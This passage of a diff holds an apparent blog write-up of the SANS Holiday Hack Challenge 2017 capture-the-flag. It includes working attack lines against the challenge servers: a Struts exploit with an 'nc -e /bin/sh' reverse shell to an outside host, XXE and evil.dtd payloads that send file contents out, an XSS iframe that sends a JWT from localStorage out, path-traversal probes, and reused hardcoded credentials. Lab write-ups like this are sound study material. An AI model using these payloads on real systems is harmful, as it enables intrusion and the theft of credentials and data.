class=&quot;n&quot;&gt;shadow&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;inspecting-christmassongsdb-sugarplum-mary&quot;&gt;Inspecting christmassongs.db Sugarplum Mary&lt;/h3&gt;
+
+&lt;p&gt;Sugarplum would like you to do some SQL queries to find the most popular christmas song.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sugarplum Mary is &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a tizzy, we hope you can assist.
+Christmas songs abound, with many likes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;our midst.
+The database is populated, ready &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you to address.
+Identify the song whose popularity is the best.
+total 20684
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 15982592 Nov 29 19:28 christmassongs.db
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root  5197352 Dec  7 15:10 runtoanswer
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Inspecting the database file and its tables it will reveal it’s structure. You have to count the likes depending on a given songid:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@907587d5d549:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlite3 christmassongs.db 
+SQLite version 3.11.0 2016-02-15 17:29:24
+Enter &lt;span class=&quot;s2&quot;&gt;&quot;.help&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage hints.
+sqlite&amp;gt; .schema
+CREATE TABLE songs&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;INTEGER PRIMARY KEY AUTOINCREMENT,
+  title TEXT,
+  artist TEXT,
+  year TEXT,
+  notes TEXT
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+CREATE TABLE likes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;INTEGER PRIMARY KEY AUTOINCREMENT,
+  like INTEGER,
+  datetime INTEGER,
+  songid INTEGER,
+  FOREIGN KEY&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;songid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; REFERENCES songs&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can do this with the &lt;code class=&quot;highlighter-rouge&quot;&gt;HAVING&lt;/code&gt; syntax. It gives you the possibility to count all columns for a given value &lt;code class=&quot;highlighter-rouge&quot;&gt;like==1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;songid&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlite&amp;gt; SELECT like,songid,COUNT(*) c FROM likes where like==1 GROUP BY songid HAVING c &amp;gt; 1700 limit 100;
+1|90|1715
+1|98|1706
+1|134|1719
+1|199|1702
+1|245|1756
+1|265|1720
+1|392|8996
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Querying this songid from the second table gives us the songs name:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select title,id from songs where id=392;
+Stairway to Heaven|392
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;apache-struts-server&quot;&gt;Apache Struts Server&lt;/h2&gt;
+&lt;p&gt;Task: 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball’s password?&lt;/p&gt;
+
+&lt;p&gt;Sparkle Redberry gives a lot of hints about this tasks. It’s very important to get this because all the other servers are only accessible internally over this one.
+We can summarize the hints from Sparkle:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Sometimes development content won’t be deleted in production state of websites&lt;/li&gt;
+  &lt;li&gt;Alabaster, the admin, uses Apache Struts&lt;/li&gt;
+  &lt;li&gt;Backdoors and webshells are good to access system remotely&lt;/li&gt;
+  &lt;li&gt;Example for simple PHP webshell and &lt;a href=&quot;https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Some silly developers leave hardcoded credentials behind&lt;/li&gt;
+  &lt;li&gt;Isn’t vulnerable against CVE-2017-5638&lt;/li&gt;
+  &lt;li&gt;Special character issues of XML and how to avoid them for exploiting with &lt;a href=&quot;https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;SiteScreenshot&lt;/p&gt;
+
+&lt;p&gt;Following the first hint I inspect the source code of the site:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt; 
+    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Development version --&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://dev.northpolechristmastown.com&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;display: none;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Access Development Version&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nmapping both servers reveals that it’s the same machine with multiple webservers serving different subdomains.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap l2s.northpolechristmastown.com
+
+Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-01-12 22:05 CET
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;l2s.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;35.185.84.51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.093s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+rDNS record &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;35.185.84.51: 51.84.185.35.bc.googleusercontent.com
+Not shown: 994 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  open   https
+3389/tcp closed ms-wbt-server
+5060/tcp closed sip
+5061/tcp closed sip-tls
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.86 seconds
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap dev.northpolechristmastown.com
+
+Starting Nmap 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-01-12 22:06 CET
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;dev.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;35.185.84.51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.096s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+rDNS record &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;35.185.84.51: 51.84.185.35.bc.googleusercontent.com
+Not shown: 994 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  open   https
+3389/tcp closed ms-wbt-server
+5060/tcp closed sip
+5061/tcp closed sip-tls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After some research following the hints I decided to use this &lt;a href=&quot;https://github.com/mazen160/struts-pwn_CVE-2017-9805&quot;&gt;tool&lt;/a&gt; after it’s indicating that this server is vulnerable:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python struts-pwn.py &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; https://dev.northpolechristmastown.com/orders/
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; URL: https://dev.northpolechristmastown.com/orders/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Status: Vulnerable!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%] Done.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After some try and error uploading a webshell I ended up using a simple reverse shell with another but simliar tool.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python struts_xml.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://dev.northpolechristmastown.com/orders/- &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/sh federland.dnshome.de 56123&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;As this is simple reverse shell is very annoying I was able to upgrade it nearly to a real TTY using this &lt;a href=&quot;https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/&quot;&gt;article&lt;/a&gt; and this resulting commands:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin:/usr/bin:/sbin:/bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This two commands will give you easy access to all installed utilities and the possibility of using special keys.&lt;/p&gt;
+
+&lt;p&gt;As mentioned in the hints, developers will leave credentials behind, you have to look out for developing files like source code or documentation. As Alabaster deploys a Apache Struts server it’s possible he created some java files for a apache tomcat server. Searching the default directory for the tomcat files we can find it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rli&lt;/span&gt; password opt
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
+            ...
+	    final String username &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;alabaster_snowball&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            final String password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;stream_unhappy_buy_loss&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   
+	    ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;network-reconnaisance&quot;&gt;Network Reconnaisance&lt;/h2&gt;
+
+&lt;p&gt;Task: 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 10.142.0.0/24 
+Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-12-17 14:38 UTC
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-l2s-proxy.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-apache-struts1.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;edb.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+389/tcp  open  ldap
+8080/tcp open  http-proxy
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-emi.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hhc17-apache-struts2.c.holidayhack2017.internal &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8000/tcp open  http-alt
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eaas.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;mail.northpolechristmastown.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.142.0.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+143/tcp  open  imap
+2525/tcp open  ms-v-worlds
+3000/tcp open  ppp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;nmap -PS445 10.142.0.0/24&lt;/p&gt;
+
+&lt;p&gt;Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.00073s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server&lt;/p&gt;
+
+&lt;h2 id=&quot;windows-smb-server&quot;&gt;Windows SMB Server&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 139:10.142.0.7:139 -L 445:10.142.0.7:445 -L 135:10.142.0.7:135 -L 3389:10.142.0.7:3389  alabaster_snowball@l2s.northpolechristmastown.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap -u alabaster_snowball -p stream_unhappy_buy_loss -d workgroup -H 127.0.0.1 -R
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 127.0.0.1...
+[+] IP: 127.0.0.1:445	Name: localhost                                         
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	FileStor                                          	READ ONLY
+	.\
+	dr--r--r--                0 Wed Dec  6 22:51:45 2017	.
+	dr--r--r--                0 Wed Dec  6 22:51:45 2017	..
+	-r--r--r--           255520 Sun Dec 17 08:33:12 2017	BOLO - Munchkin Mole Report.docx
+	-r--r--r--          1275756 Mon Dec  4 21:04:34 2017	GreatBookPage3.pdf
+	-r--r--r--           111852 Sun Dec 17 08:31:32 2017	MEMO - Calculator Access for Wunorse.docx
+	-r--r--r--           133295 Wed Dec  6 22:47:47 2017	MEMO - Password Policy Reminder.docx
+	-r--r--r--            10245 Wed Dec  6 23:28:21 2017	Naughty and Nice List.csv
+	-r--r--r--            60344 Wed Dec  6 22:51:47 2017	Naughty and Nice List.docx
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbget -U alabaster_snowball smb://127.0.0.1/FileStor/GreatBookPage3.pdfPassword for [alabaster_snowball] connecting to //FileStor/127.0.0.1: 
+Using workgroup WORKGROUP, user alabaster_snowball
+smb://127.0.0.1/FileStor/GreatBookPage3.pdf                                                    
+Downloaded 1,22MB in 13 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;mail-server-with-custom-cookie-based-encryption&quot;&gt;Mail Server with custom Cookie based encryption&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 143:10.142.0.5:143  -L  8080:10.142.0.5:80 -L 25:10.142.0.5:25 -L 2222:10.142.0.5:22 -L 2525:10.142.0.5:2525 -L 3000:10.142.0.5:3000  alabaster_snowball@l2s.northpolechristmastown.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ dirb http://127.0.0.1:8080
+
+---- Scanning URL: http://127.0.0.1:8080/ ----
++ http://127.0.0.1:8080/index.html (CODE:200|SIZE:11321)                                      
++ http://127.0.0.1:8080/info.php (CODE:200|SIZE:90820)   
+
+./dotdotpwn.pl -m http -h 127.0.0.1 -x 8080 -M GET
+[*] HTTP Status: 400 | Testing Path: http://127.0.0.1:8080/..%00%u2216..%00%u2216..%00%u2216..%00%u2216etc%u2216issue
+[*] HTTP Status: 400 | Testing Path: http://127.0.0.1:8080/..%00%u2216..%00%u2216..%00%u2216..%00%u2216..%00%u2216etc%u2216passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sV 127.0.0.1 -p 22,25,8080,143,2525,3000
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-20 18:54 CET
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000055s latency).
+
+PORT     STATE  SERVICE VERSION
+22/tcp   closed ssh
+25/tcp   open   smtp    Postfix smtpd
+143/tcp  open   imap    Dovecot imapd
+2525/tcp open   smtp    Postfix smtpd
+3000/tcp open   http    Node.js Express framework
+8080/tcp open   http    nginx 1.10.3 (Ubuntu)
+Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;EWA=”{“name”:”GUEST”,”plaintext”:””,”ciphertext”:””}”&lt;/p&gt;
+
+&lt;p&gt;EWA={“name”:”alabaster.snowball@northpolechristmastown.com”,”plaintext”:””,”ciphertext”:”WmczgfAW8upVlZabYxzEXQ”}&lt;/p&gt;
+
+&lt;h2 id=&quot;online-resource-management-with-xml-external-entity-xxe-vulnerability&quot;&gt;Online Resource Management with XML External Entity (XXE) Vulnerability&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 8080:10.142.0.13:80 -L 3389:10.142.0.7:3389  alabaster_snowball@l2s.northpolechristmastown.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat order.xml
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;
+&amp;lt;!DOCTYPE demo [
+    &amp;lt;!ELEMENT demo ANY &amp;gt;
+    &amp;lt;!ENTITY % extentity SYSTEM &quot;http://federland.dnshome.de:13337/evil.dtd&quot;&amp;gt;
+    %extentity;
+    %inception;
+    %sendit;
+    ]
+&amp;lt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat evil.dtd 
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;!ENTITY % stolendata SYSTEM &quot;file:///c:/greatbook.txt&quot;&amp;gt;
+&amp;lt;!ENTITY % inception &quot;&amp;lt;!ENTITY &amp;amp;#x25; sendit SYSTEM 'http://federland.dnshome.de:13338/?%stolendata;'&amp;gt;&quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -l 13338
+GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1
+Host: federland.dnshome.de:13338
+Connection: Keep-Alive
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;database-with-xss-vulnerability-javascript-web-token-jwt-vulnerability-and-ldap-injection-vulnerability&quot;&gt;Database with XSS Vulnerability, JavaScript Web Token (JWT) Vulnerability and LDAP Injection Vulnerability&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 18080:10.142.0.6:80  -L 2222:10.142.0.6:22 -L 3890:10.142.0.6:389 -L 28080:10.142.0.6:8080  alabaster_snowball@l2s.northpolechristmastown.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch -h 127.0.0.1 -p 3890 -x -b &quot;dc=northpolechristmastown,dc=com&quot; &amp;gt; edb_ldap_dump.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat edb_ldap_dump.txt | grep &quot;mail:&quot; | cut -d&quot;:&quot; -f2 | cut -d&quot;@&quot; -f1 &amp;gt; usernames.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;xss&quot;&gt;XSS&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hi plz restore password &amp;lt;IFRAME SRC=# onload=&quot;document.getElementsByClassName('ticketlogo tooltipped')[0].setAttribute('src','http://federland.dnshome.de:56123/'+localStorage.getItem('np-auth'))&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;
+
+nc -l -p 56123
+GET /eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
+Referer: http://127.0.0.1/reset_request?ticket=W0M50-B1XAN-2L4ND-247NN
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,*
+Host: federland.dnshome.de:56123
+
+ echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I | base64 -d
+{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;jwt&quot;&gt;JWT&lt;/h3&gt;
+
